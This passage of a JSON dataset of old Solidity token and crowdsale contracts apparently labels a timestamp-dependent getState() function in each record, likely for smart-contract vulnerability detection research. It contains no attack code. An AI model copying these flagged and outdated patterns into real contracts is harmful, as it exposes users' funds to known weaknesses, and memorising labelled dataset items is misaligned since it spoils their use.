(token.reservedTokensDestinationsLen() > 0) {\n assert(reservedTokensAreDistributed);\n }\n token.releaseTokenTransfer();\n }\n}",
  "extract_feature": [
    "function getState() public constant returns (State) {\nif(finalized) return State.Finalized;\nelse if (address(finalizeAgent) == 0) return State.Preparing;\nelse if (!finalizeAgent.isSane()) return State.Preparing;\nelse if (!pricingStrategy.isSane(address(this))) return State.Preparing;\nelse if (block.timestamp < startsAt) return State.PreFunding;\nelse if (block.timestamp <= endsAt && !isCrowdsaleFull()) return State.Funding;\nelse if (isMinimumGoalReached()) return State.Success;\nelse return State.Failure;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaabfa0e1460cdfa1f66"
  },
  "filename": "8598.sol",
  "content": "pragma solidity ^0.4.8;\ncontract SafeMath {\n function safeMul(uint a, uint b) internal returns (uint) {\n uint c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function safeDiv(uint a, uint b) internal returns (uint) {\n assert(b > 0);\n uint c = a / b;\n assert(a == b * c + a % b);\n return c;\n }\n function safeSub(uint a, uint b) internal returns (uint) {\n assert(b <= a);\n return a - b;\n }\n function safeAdd(uint a, uint b) internal returns (uint) {\n uint c = a + b;\n assert(c>=a && c>=b);\n return c;\n }\n function max64(uint64 a, uint64 b) internal constant returns (uint64) {\n return a >= b ? a : b;\n }\n function min64(uint64 a, uint64 b) internal constant returns (uint64) {\n return a < b ? a : b;\n }\n function max256(uint256 a, uint256 b) internal constant returns (uint256) {\n return a >= b ? a : b;\n }\n function min256(uint256 a, uint256 b) internal constant returns (uint256) {\n return a < b ? a : b;\n }\n}\ncontract ERC20Basic {\n uint256 public totalSupply;\n function balanceOf(address who) public constant returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) onlyOwner public {\n require(newOwner != address(0));\n OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\nlibrary SafeMathLibExt {\n function times(uint a, uint b) returns (uint) {\n uint c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function divides(uint a, uint b) returns (uint) {\n assert(b > 0);\n uint c = a / b;\n assert(a == b * c + a % b);\n return c;\n }\n function minus(uint a, uint b) returns (uint) {\n assert(b <= a);\n return a - b;\n }\n function plus(uint a, uint b) returns (uint) {\n uint c = a + b;\n assert(c>=a);\n return c;\n }\n}\ncontract Haltable is Ownable {\n bool public halted;\n modifier stopInEmergency {\n if (halted) throw;\n _;\n }\n modifier stopNonOwnersInEmergency {\n if (halted && msg.sender != owner) throw;\n _;\n }\n modifier onlyInEmergency {\n if (!halted) throw;\n _;\n }\n function halt() external onlyOwner {\n halted = true;\n }\n function unhalt() external onlyOwner onlyInEmergency {\n halted = false;\n }\n}\ncontract PricingStrategy {\n address public tier;\n function isPricingStrategy() public constant returns (bool) {\n return true;\n }\n function isSane(address crowdsale) public constant returns (bool) {\n return true;\n }\n function isPresalePurchase(address purchaser) public constant returns (bool) {\n return false;\n }\n function updateRate(uint newOneTokenInWei) public;\n function calculatePrice(uint value, uint weiRaised, uint tokensSold, address msgSender, uint decimals) public constant returns (uint tokenAmount);\n}\ncontract FinalizeAgent {\n bool public reservedTokensAreDistributed = false;\n function isFinalizeAgent() public constant returns(bool) {\n return true;\n }\n function isSane() public constant returns (bool);\n function distributeReservedTokens(uint reservedTokensDistributionBatch);\n function finalizeCrowdsale();\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public constant returns (uint256);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract FractionalERC20Ext is ERC20 {\n uint public decimals;\n uint public minCap;\n}\ncontract CrowdsaleExt is Haltable {\n uint public MAX_INVESTMENTS_BEFORE_MULTISIG_CHANGE = 5;\n using SafeMathLibExt for uint;\n FractionalERC20Ext public token;\n PricingStrategy public pricingStrategy;\n FinalizeAgent public finalizeAgent;\n string public name;\n address public multisigWallet;\n uint public minimumFundingGoal;\n uint public startsAt;\n uint public endsAt;\n uint public tokensSold = 0;\n uint public weiRaised = 0;\n uint public investorCount = 0;\n bool public finalized;\n bool public isWhiteListed;\n address[] public joinedCrowdsales;\n uint8 public joinedCrowdsalesLen = 0;\n uint8 public joinedCrowdsalesLenMax = 50;\n struct JoinedCrowdsaleStatus {\n bool isJoined;\n uint8 position;\n }\n mapping (address => JoinedCrowdsaleStatus) joinedCrowdsaleState;\n mapping (address => uint256) public investedAmountOf;\n mapping (address => uint256) public tokenAmountOf;\n struct WhiteListData {\n bool status;\n uint minCap;\n uint maxCap;\n }\n bool public isUpdatable;\n mapping (address => WhiteListData) public earlyParticipantWhitelist;\n address[] public whitelistedParticipants;\n uint public ownerTestValue;\n enum State{Unknown, Preparing, PreFunding, Funding, Success, Failure, Finalized}\n event Invested(address investor, uint weiAmount, uint tokenAmount, uint128 customerId);\n event Whitelisted(address addr, bool status, uint minCap, uint maxCap);\n event WhitelistItemChanged(address addr, bool status, uint minCap, uint maxCap);\n event StartsAtChanged(uint newStartsAt);\n event EndsAtChanged(uint newEndsAt);\n function CrowdsaleExt(string _name, address _token, PricingStrategy _pricingStrategy, address _multisigWallet, uint _start, uint _end, uint _minimumFundingGoal, bool _isUpdatable, bool _isWhiteListed) {\n owner = msg.sender;\n name = _name;\n token = FractionalERC20Ext(_token);\n setPricingStrategy(_pricingStrategy);\n multisigWallet = _multisigWallet;\n if(multisigWallet == 0) {\n throw;\n }\n if(_start == 0) {\n throw;\n }\n startsAt = _start;\n if(_end == 0) {\n throw;\n }\n endsAt = _end;\n if(startsAt >= endsAt) {\n throw;\n }\n minimumFundingGoal = _minimumFundingGoal;\n isUpdatable = _isUpdatable;\n isWhiteListed = _isWhiteListed;\n }\n function() payable {\n throw;\n }\n function investInternal(address receiver, uint128 customerId) stopInEmergency private {\n if(getState() == State.PreFunding) {\n throw;\n } else if(getState() == State.Funding) {\n if(isWhiteListed) {\n if(!earlyParticipantWhitelist[receiver].status) {\n throw;\n }\n }\n } else {\n throw;\n }\n uint weiAmount = msg.value;\n uint tokenAmount = pricingStrategy.calculatePrice(weiAmount, weiRaised, tokensSold, msg.sender, token.decimals());\n if(tokenAmount == 0) {\n throw;\n }\n if(isWhiteListed) {\n if(tokenAmount < earlyParticipantWhitelist[receiver].minCap && tokenAmountOf[receiver] == 0) {\n throw;\n }\n if (isBreakingInvestorCap(receiver, tokenAmount)) {\n throw;\n }\n updateInheritedEarlyParticipantWhitelist(receiver, tokenAmount);\n } else {\n if(tokenAmount < token.minCap() && tokenAmountOf[receiver] == 0) {\n throw;\n }\n }\n if(investedAmountOf[receiver] == 0) {\n investorCount++;\n }\n investedAmountOf[receiver] = investedAmountOf[receiver].plus(weiAmount);\n tokenAmountOf[receiver] = tokenAmountOf[receiver].plus(tokenAmount);\n weiRaised = weiRaised.plus(weiAmount);\n tokensSold = tokensSold.plus(tokenAmount);\n if(isBreakingCap(weiAmount, tokenAmount, weiRaised, tokensSold)) {\n throw;\n }\n assignTokens(receiver, tokenAmount);\n if(!multisigWallet.send(weiAmount)) throw;\n Invested(receiver, weiAmount, tokenAmount, customerId);\n }\n function invest(address addr) public payable {\n investInternal(addr, 0);\n }\n function buy() public payable {\n invest(msg.sender);\n }\n function distributeReservedTokens(uint reservedTokensDistributionBatch) public inState(State.Success) onlyOwner stopInEmergency {\n if(finalized) {\n throw;\n }\n if(address(finalizeAgent) != address(0)) {\n finalizeAgent.distributeReservedTokens(reservedTokensDistributionBatch);\n }\n }\n function areReservedTokensDistributed() public constant returns (bool) {\n return finalizeAgent.reservedTokensAreDistributed();\n }\n function canDistributeReservedTokens() public constant returns(bool) {\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n if ((lastTierCntrct.getState() == State.Success) && !lastTierCntrct.halted() && !lastTierCntrct.finalized() && !lastTierCntrct.areReservedTokensDistributed()) return true;\n return false;\n }\n function finalize() public inState(State.Success) onlyOwner stopInEmergency {\n if(finalized) {\n throw;\n }\n if(address(finalizeAgent) != address(0)) {\n finalizeAgent.finalizeCrowdsale();\n }\n finalized = true;\n }\n function setFinalizeAgent(FinalizeAgent addr) public onlyOwner {\n assert(address(addr) != address(0));\n assert(address(finalizeAgent) == address(0));\n finalizeAgent = addr;\n if(!finalizeAgent.isFinalizeAgent()) {\n throw;\n }\n }\n function setEarlyParticipantWhitelist(address addr, bool status, uint minCap, uint maxCap) public onlyOwner {\n if (!isWhiteListed) throw;\n assert(addr != address(0));\n assert(maxCap > 0);\n assert(minCap <= maxCap);\n assert(now <= endsAt);\n if (!isAddressWhitelisted(addr)) {\n whitelistedParticipants.push(addr);\n Whitelisted(addr, status, minCap, maxCap);\n } else {\n WhitelistItemChanged(addr, status, minCap, maxCap);\n }\n earlyParticipantWhitelist[addr] = WhiteListData({status:status, minCap:minCap, maxCap:maxCap});\n }\n function setEarlyParticipantWhitelistMultiple(address[] addrs, bool[] statuses, uint[] minCaps, uint[] maxCaps) public onlyOwner {\n if (!isWhiteListed) throw;\n assert(now <= endsAt);\n assert(addrs.length == statuses.length);\n assert(statuses.length == minCaps.length);\n assert(minCaps.length == maxCaps.length);\n for (uint iterator = 0; iterator < addrs.length; iterator++) {\n setEarlyParticipantWhitelist(addrs[iterator], statuses[iterator], minCaps[iterator], maxCaps[iterator]);\n }\n }\n function updateInheritedEarlyParticipantWhitelist(address reciever, uint tokensBought) private {\n if (!isWhiteListed) throw;\n if (tokensBought < earlyParticipantWhitelist[reciever].minCap && tokenAmountOf[reciever] == 0) throw;\n uint8 tierPosition = getTierPosition(this);\n for (uint8 j = tierPosition + 1; j < joinedCrowdsalesLen; j++) {\n CrowdsaleExt crowdsale = CrowdsaleExt(joinedCrowdsales[j]);\n crowdsale.updateEarlyParticipantWhitelist(reciever, tokensBought);\n }\n }\n function updateEarlyParticipantWhitelist(address addr, uint tokensBought) public {\n if (!isWhiteListed) throw;\n assert(addr != address(0));\n assert(now <= endsAt);\n assert(isTierJoined(msg.sender));\n if (tokensBought < earlyParticipantWhitelist[addr].minCap && tokenAmountOf[addr] == 0) throw;\n uint newMaxCap = earlyParticipantWhitelist[addr].maxCap;\n newMaxCap = newMaxCap.minus(tokensBought);\n earlyParticipantWhitelist[addr] = WhiteListData({status:earlyParticipantWhitelist[addr].status, minCap:0, maxCap:newMaxCap});\n }\n function isAddressWhitelisted(address addr) public constant returns(bool) {\n for (uint i = 0; i < whitelistedParticipants.length; i++) {\n if (whitelistedParticipants[i] == addr) {\n return true;\n break;\n }\n }\n return false;\n }\n function whitelistedParticipantsLength() public constant returns (uint) {\n return whitelistedParticipants.length;\n }\n function isTierJoined(address addr) public constant returns(bool) {\n return joinedCrowdsaleState[addr].isJoined;\n }\n function getTierPosition(address addr) public constant returns(uint8) {\n return joinedCrowdsaleState[addr].position;\n }\n function getLastTier() public constant returns(address) {\n if (joinedCrowdsalesLen > 0)\n return joinedCrowdsales[joinedCrowdsalesLen - 1];\n else\n return address(0);\n }\n function setJoinedCrowdsales(address addr) private onlyOwner {\n assert(addr != address(0));\n assert(joinedCrowdsalesLen <= joinedCrowdsalesLenMax);\n assert(!isTierJoined(addr));\n joinedCrowdsales.push(addr);\n joinedCrowdsaleState[addr] = JoinedCrowdsaleStatus({\n isJoined: true,\n position: joinedCrowdsalesLen\n });\n joinedCrowdsalesLen++;\n }\n function updateJoinedCrowdsalesMultiple(address[] addrs) public onlyOwner {\n assert(addrs.length > 0);\n assert(joinedCrowdsalesLen == 0);\n assert(addrs.length <= joinedCrowdsalesLenMax);\n for (uint8 iter = 0; iter < addrs.length; iter++) {\n setJoinedCrowdsales(addrs[iter]);\n }\n }\n function setStartsAt(uint time) onlyOwner {\n assert(!finalized);\n assert(isUpdatable);\n assert(now <= time);\n assert(time <= endsAt);\n assert(now <= startsAt);\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n if (lastTierCntrct.finalized()) throw;\n uint8 tierPosition = getTierPosition(this);\n for (uint8 j = 0; j < tierPosition; j++) {\n CrowdsaleExt crowdsale = CrowdsaleExt(joinedCrowdsales[j]);\n assert(time >= crowdsale.endsAt());\n }\n startsAt = time;\n StartsAtChanged(startsAt);\n }\n function setEndsAt(uint time) public onlyOwner {\n assert(!finalized);\n assert(isUpdatable);\n assert(now <= time);\n assert(startsAt <= time);\n assert(now <= endsAt);\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n if (lastTierCntrct.finalized()) throw;\n uint8 tierPosition = getTierPosition(this);\n for (uint8 j = tierPosition + 1; j < joinedCrowdsalesLen; j++) {\n CrowdsaleExt crowdsale = CrowdsaleExt(joinedCrowdsales[j]);\n assert(time <= crowdsale.startsAt());\n }\n endsAt = time;\n EndsAtChanged(endsAt);\n }\n function setPricingStrategy(PricingStrategy _pricingStrategy) public onlyOwner {\n assert(address(_pricingStrategy) != address(0));\n assert(address(pricingStrategy) == address(0));\n pricingStrategy = _pricingStrategy;\n if(!pricingStrategy.isPricingStrategy()) {\n throw;\n }\n }\n function setMultisig(address addr) public onlyOwner {\n if(investorCount > MAX_INVESTMENTS_BEFORE_MULTISIG_CHANGE) {\n throw;\n }\n multisigWallet = addr;\n }\n function isMinimumGoalReached() public constant returns (bool reached) {\n return weiRaised >= minimumFundingGoal;\n }\n function isFinalizerSane() public constant returns (bool sane) {\n return finalizeAgent.isSane();\n }\n function isPricingSane() public constant returns (bool sane) {\n return pricingStrategy.isSane(address(this));\n }\n function getState() public constant returns (State) {\n if(finalized) return State.Finalized;\n else if (address(finalizeAgent) == 0) return State.Preparing;\n else if (!finalizeAgent.isSane()) return State.Preparing;\n else if (!pricingStrategy.isSane(address(this))) return State.Preparing;\n else if (block.timestamp < startsAt) return State.PreFunding;\n else if (block.timestamp <= endsAt && !isCrowdsaleFull()) return State.Funding;\n else if (isMinimumGoalReached()) return State.Success;\n else return State.Failure;\n }\n function isCrowdsale() public constant returns (bool) {\n return true;\n }\n modifier inState(State state) {\n if(getState() != state) throw;\n _;\n }\n function isBreakingCap(uint weiAmount, uint tokenAmount, uint weiRaisedTotal, uint tokensSoldTotal) public constant returns (bool limitBroken);\n function isBreakingInvestorCap(address receiver, uint tokenAmount) public constant returns (bool limitBroken);\n function isCrowdsaleFull() public constant returns (bool);\n function assignTokens(address receiver, uint tokenAmount) private;\n}\ncontract StandardToken is ERC20, SafeMath {\n event Minted(address receiver, uint amount);\n mapping(address => uint) balances;\n mapping (address => mapping (address => uint)) allowed;\n function isToken() public constant returns (bool weAre) {\n return true;\n }\n function transfer(address _to, uint _value) returns (bool success) {\n balances[msg.sender] = safeSub(balances[msg.sender], _value);\n balances[_to] = safeAdd(balances[_to], _value);\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint _value) returns (bool success) {\n uint _allowance = allowed[_from][msg.sender];\n balances[_to] = safeAdd(balances[_to], _value);\n balances[_from] = safeSub(balances[_from], _value);\n allowed[_from][msg.sender] = safeSub(_allowance, _value);\n Transfer(_from, _to, _value);\n return true;\n }\n function balanceOf(address _owner) constant returns (uint balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint _value) returns (bool success) {\n if ((_value != 0) && (allowed[msg.sender][_spender] != 0)) throw;\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint remaining) {\n return allowed[_owner][_spender];\n }\n}\ncontract MintableTokenExt is StandardToken, Ownable {\n using SafeMathLibExt for uint;\n bool public mintingFinished = false;\n mapping (address => bool) public mintAgents;\n event MintingAgentChanged(address addr, bool state );\n struct ReservedTokensData {\n uint inTokens;\n uint inPercentageUnit;\n uint inPercentageDecimals;\n bool isReserved;\n bool isDistributed;\n }\n mapping (address => ReservedTokensData) public reservedTokensList;\n address[] public reservedTokensDestinations;\n uint public reservedTokensDestinationsLen = 0;\n bool reservedTokensDestinationsAreSet = false;\n modifier onlyMintAgent() {\n if(!mintAgents[msg.sender]) {\n throw;\n }\n _;\n }\n modifier canMint() {\n if(mintingFinished) throw;\n _;\n }\n function finalizeReservedAddress(address addr) public onlyMintAgent canMint {\n ReservedTokensData storage reservedTokensData = reservedTokensList[addr];\n reservedTokensData.isDistributed = true;\n }\n function isAddressReserved(address addr) public constant returns (bool isReserved) {\n return reservedTokensList[addr].isReserved;\n }\n function areTokensDistributedForAddress(address addr) public constant returns (bool isDistributed) {\n return reservedTokensList[addr].isDistributed;\n }\n function getReservedTokens(address addr) public constant returns (uint inTokens) {\n return reservedTokensList[addr].inTokens;\n }\n function getReservedPercentageUnit(address addr) public constant returns (uint inPercentageUnit) {\n return reservedTokensList[addr].inPercentageUnit;\n }\n function getReservedPercentageDecimals(address addr) public constant returns (uint inPercentageDecimals) {\n return reservedTokensList[addr].inPercentageDecimals;\n }\n function setReservedTokensListMultiple(\n address[] addrs,\n uint[] inTokens,\n uint[] inPercentageUnit,\n uint[] inPercentageDecimals\n ) public canMint onlyOwner {\n assert(!reservedTokensDestinationsAreSet);\n assert(addrs.length == inTokens.length);\n assert(inTokens.length == inPercentageUnit.length);\n assert(inPercentageUnit.length == inPercentageDecimals.length);\n for (uint iterator = 0; iterator < addrs.length; iterator++) {\n if (addrs[iterator] != address(0)) {\n setReservedTokensList(addrs[iterator], inTokens[iterator], inPercentageUnit[iterator], inPercentageDecimals[iterator]);\n }\n }\n reservedTokensDestinationsAreSet = true;\n }\n function mint(address receiver, uint amount) onlyMintAgent canMint public {\n totalSupply = totalSupply.plus(amount);\n balances[receiver] = balances[receiver].plus(amount);\n Transfer(0, receiver, amount);\n }\n function setMintAgent(address addr, bool state) onlyOwner canMint public {\n mintAgents[addr] = state;\n MintingAgentChanged(addr, state);\n }\n function setReservedTokensList(address addr, uint inTokens, uint inPercentageUnit, uint inPercentageDecimals) private canMint onlyOwner {\n assert(addr != address(0));\n if (!isAddressReserved(addr)) {\n reservedTokensDestinations.push(addr);\n reservedTokensDestinationsLen++;\n }\n reservedTokensList[addr] = ReservedTokensData({\n inTokens: inTokens,\n inPercentageUnit: inPercentageUnit,\n inPercentageDecimals: inPercentageDecimals,\n isReserved: true,\n isDistributed: false\n });\n }\n}\ncontract MintedTokenCappedCrowdsaleExt is CrowdsaleExt {\n uint public maximumSellableTokens;\n function MintedTokenCappedCrowdsaleExt(\n string _name,\n address _token,\n PricingStrategy _pricingStrategy,\n address _multisigWallet,\n uint _start, uint _end,\n uint _minimumFundingGoal,\n uint _maximumSellableTokens,\n bool _isUpdatable,\n bool _isWhiteListed\n ) CrowdsaleExt(_name, _token, _pricingStrategy, _multisigWallet, _start, _end, _minimumFundingGoal, _isUpdatable, _isWhiteListed) {\n maximumSellableTokens = _maximumSellableTokens;\n }\n event MaximumSellableTokensChanged(uint newMaximumSellableTokens);\n function isBreakingCap(uint weiAmount, uint tokenAmount, uint weiRaisedTotal, uint tokensSoldTotal) public constant returns (bool limitBroken) {\n return tokensSoldTotal > maximumSellableTokens;\n }\n function isBreakingInvestorCap(address addr, uint tokenAmount) public constant returns (bool limitBroken) {\n assert(isWhiteListed);\n uint maxCap = earlyParticipantWhitelist[addr].maxCap;\n return (tokenAmountOf[addr].plus(tokenAmount)) > maxCap;\n }\n function isCrowdsaleFull() public constant returns (bool) {\n return tokensSold >= maximumSellableTokens;\n }\n function setMaximumSellableTokens(uint tokens) public onlyOwner {\n assert(!finalized);\n assert(isUpdatable);\n assert(now <= startsAt);\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n assert(!lastTierCntrct.finalized());\n maximumSellableTokens = tokens;\n MaximumSellableTokensChanged(maximumSellableTokens);\n }\n function updateRate(uint newOneTokenInWei) public onlyOwner {\n assert(!finalized);\n assert(isUpdatable);\n assert(now <= startsAt);\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n assert(!lastTierCntrct.finalized());\n pricingStrategy.updateRate(newOneTokenInWei);\n }\n function assignTokens(address receiver, uint tokenAmount) private {\n MintableTokenExt mintableToken = MintableTokenExt(token);\n mintableToken.mint(receiver, tokenAmount);\n }\n}",
  "extract_feature": [
    "function getState() public constant returns (State) {\nif(finalized) return State.Finalized;\nelse if (address(finalizeAgent) == 0) return State.Preparing;\nelse if (!finalizeAgent.isSane()) return State.Preparing;\nelse if (!pricingStrategy.isSane(address(this))) return State.Preparing;\nelse if (block.timestamp < startsAt) return State.PreFunding;\nelse if (block.timestamp <= endsAt && !isCrowdsaleFull()) return State.Funding;\nelse if (isMinimumGoalReached()) return State.Success;\nelse return State.Failure;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaabfa0e1460cdfa1f67"
  },
  "filename": "8606.sol",
  "content": "pragma solidity ^0.4.21;\ncontract ERC20Basic {\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) public onlyOwner {\n require(newOwner != address(0));\n emit OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\nlibrary DateTime {\n struct _DateTime {\n uint16 year;\n uint8 month;\n uint8 day;\n uint8 hour;\n uint8 minute;\n uint8 second;\n uint8 weekday;\n }\n uint constant DAY_IN_SECONDS = 86400;\n uint constant YEAR_IN_SECONDS = 31536000;\n uint constant LEAP_YEAR_IN_SECONDS = 31622400;\n uint constant HOUR_IN_SECONDS = 3600;\n uint constant MINUTE_IN_SECONDS = 60;\n uint16 constant ORIGIN_YEAR = 1970;\n function isLeapYear(uint16 year) public pure returns (bool) {\n if (year % 4 != 0) {\n return false;\n }\n if (year % 100 != 0) {\n return true;\n }\n if (year % 400 != 0) {\n return false;\n }\n return true;\n }\n function leapYearsBefore(uint year) public pure returns (uint) {\n year -= 1;\n return year / 4 - year / 100 + year / 400;\n }\n function getDaysInMonth(uint8 month, uint16 year) public pure returns (uint8) {\n if (month == 1 || month == 3 || month == 5 || month == 7 || month == 8 || month == 10 || month == 12) {\n return 31;\n }\n else if (month == 4 || month == 6 || month == 9 || month == 11) {\n return 30;\n }\n else if (isLeapYear(year)) {\n return 29;\n }\n else {\n return 28;\n }\n }\n function parseTimestamp(uint timestamp) internal pure returns (_DateTime dt) {\n uint secondsAccountedFor = 0;\n uint buf;\n uint8 i;\n dt.year = getYear(timestamp);\n buf = leapYearsBefore(dt.year) - leapYearsBefore(ORIGIN_YEAR);\n secondsAccountedFor += LEAP_YEAR_IN_SECONDS * buf;\n secondsAccountedFor += YEAR_IN_SECONDS * (dt.year - ORIGIN_YEAR - buf);\n uint secondsInMonth;\n for (i = 1; i <= 12; i++) {\n secondsInMonth = DAY_IN_SECONDS * getDaysInMonth(i, dt.year);\n if (secondsInMonth + secondsAccountedFor > timestamp) {\n dt.month = i;\n break;\n }\n secondsAccountedFor += secondsInMonth;\n }\n for (i = 1; i <= getDaysInMonth(dt.month, dt.year); i++) {\n if (DAY_IN_SECONDS + secondsAccountedFor > timestamp) {\n dt.day = i;\n break;\n }\n secondsAccountedFor += DAY_IN_SECONDS;\n }\n dt.hour = getHour(timestamp);\n dt.minute = getMinute(timestamp);\n dt.second = getSecond(timestamp);\n dt.weekday = getWeekday(timestamp);\n }\n function getYear(uint timestamp) public pure returns (uint16) {\n uint secondsAccountedFor = 0;\n uint16 year;\n uint numLeapYears;\n year = uint16(ORIGIN_YEAR + timestamp / YEAR_IN_SECONDS);\n numLeapYears = leapYearsBefore(year) - leapYearsBefore(ORIGIN_YEAR);\n secondsAccountedFor += LEAP_YEAR_IN_SECONDS * numLeapYears;\n secondsAccountedFor += YEAR_IN_SECONDS * (year - ORIGIN_YEAR - numLeapYears);\n while (secondsAccountedFor > timestamp) {\n if (isLeapYear(uint16(year - 1))) {\n secondsAccountedFor -= LEAP_YEAR_IN_SECONDS;\n }\n else {\n secondsAccountedFor -= YEAR_IN_SECONDS;\n }\n year -= 1;\n }\n return year;\n }\n function getMonth(uint timestamp) public pure returns (uint8) {\n return parseTimestamp(timestamp).month;\n }\n function getDay(uint timestamp) public pure returns (uint8) {\n return parseTimestamp(timestamp).day;\n }\n function getHour(uint timestamp) public pure returns (uint8) {\n return uint8((timestamp / 60 / 60) % 24);\n }\n function getMinute(uint timestamp) public pure returns (uint8) {\n return uint8((timestamp / 60) % 60);\n }\n function getSecond(uint timestamp) public pure returns (uint8) {\n return uint8(timestamp % 60);\n }\n function getWeekday(uint timestamp) public pure returns (uint8) {\n return uint8((timestamp / DAY_IN_SECONDS + 4) % 7);\n }\n function toTimestamp(uint16 year, uint8 month, uint8 day) public pure returns (uint timestamp) {\n return toTimestamp(year, month, day, 0, 0, 0);\n }\n function toTimestamp(uint16 year, uint8 month, uint8 day, uint8 hour) public pure returns (uint timestamp) {\n return toTimestamp(year, month, day, hour, 0, 0);\n }\n function toTimestamp(uint16 year, uint8 month, uint8 day, uint8 hour, uint8 minute) public pure returns (uint timestamp) {\n return toTimestamp(year, month, day, hour, minute, 0);\n }\n function toTimestamp(uint16 year, uint8 month, uint8 day, uint8 hour, uint8 minute, uint8 second) public pure returns (uint timestamp) {\n uint16 i;\n for (i = ORIGIN_YEAR; i < year; i++) {\n if (isLeapYear(i)) {\n timestamp += LEAP_YEAR_IN_SECONDS;\n }\n else {\n timestamp += YEAR_IN_SECONDS;\n }\n }\n uint8[12] memory monthDayCounts;\n monthDayCounts[0] = 31;\n if (isLeapYear(year)) {\n monthDayCounts[1] = 29;\n }\n else {\n monthDayCounts[1] = 28;\n }\n monthDayCounts[2] = 31;\n monthDayCounts[3] = 30;\n monthDayCounts[4] = 31;\n monthDayCounts[5] = 30;\n monthDayCounts[6] = 31;\n monthDayCounts[7] = 31;\n monthDayCounts[8] = 30;\n monthDayCounts[9] = 31;\n monthDayCounts[10] = 30;\n monthDayCounts[11] = 31;\n for (i = 1; i < month; i++) {\n timestamp += DAY_IN_SECONDS * monthDayCounts[i - 1];\n }\n timestamp += DAY_IN_SECONDS * (day - 1);\n timestamp += HOUR_IN_SECONDS * (hour);\n timestamp += MINUTE_IN_SECONDS * (minute);\n timestamp += second;\n return timestamp;\n }\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract BasicToken is ERC20Basic {\n using SafeMath for uint256;\n mapping(address => uint256) balances;\n uint256 totalSupply_;\n function totalSupply() public view returns (uint256) {\n return totalSupply_;\n }\n function transfer(address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[msg.sender]);\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n emit Transfer(msg.sender, _to, _value);\n return true;\n }\n function balanceOf(address _owner) public view returns (uint256) {\n return balances[_owner];\n }\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public view returns (uint256);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract StandardToken is ERC20, BasicToken {\n mapping (address => mapping (address => uint256)) internal allowed;\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[_from]);\n require(_value <= allowed[_from][msg.sender]);\n balances[_from] = balances[_from].sub(_value);\n balances[_to] = balances[_to].add(_value);\n allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\n emit Transfer(_from, _to, _value);\n return true;\n }\n function approve(address _spender, uint256 _value) public returns (bool) {\n allowed[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) public view returns (uint256) {\n return allowed[_owner][_spender];\n }\n function increaseApproval(address _spender, uint _addedValue) public returns (bool) {\n allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);\n emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool) {\n uint oldValue = allowed[msg.sender][_spender];\n if (_subtractedValue > oldValue) {\n allowed[msg.sender][_spender] = 0;\n } else {\n allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);\n }\n emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n}\ncontract BurnableToken is BasicToken {\n event Burn(address indexed burner, uint256 value);\n function burn(uint256 _value) public returns (bool) {\n _burn(msg.sender, _value);\n return true;\n }\n function _burn(address _who, uint256 _value) internal {\n require(_value <= balances[_who]);\n balances[_who] = balances[_who].sub(_value);\n totalSupply_ = totalSupply_.sub(_value);\n emit Burn(_who, _value);\n emit Transfer(_who, address(0), _value);\n }\n}\ncontract ReentrancyGuard {\n bool private reentrancyLock = false;\n modifier nonReentrant() {\n require(!reentrancyLock);\n reentrancyLock = true;\n _;\n reentrancyLock = false;\n }\n}\ncontract Claimable is Ownable {\n address public 